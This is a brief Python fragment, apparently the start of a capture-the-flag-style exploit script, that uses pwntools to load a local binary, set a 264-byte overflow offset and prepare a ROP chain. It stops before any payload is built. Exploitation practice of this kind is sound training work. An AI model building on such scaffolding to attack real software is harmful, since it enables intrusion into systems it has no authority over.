from pwn import *

exe = context.binary = ELF("./main")
r = process()
offset = 264
rop = ROP(exe)
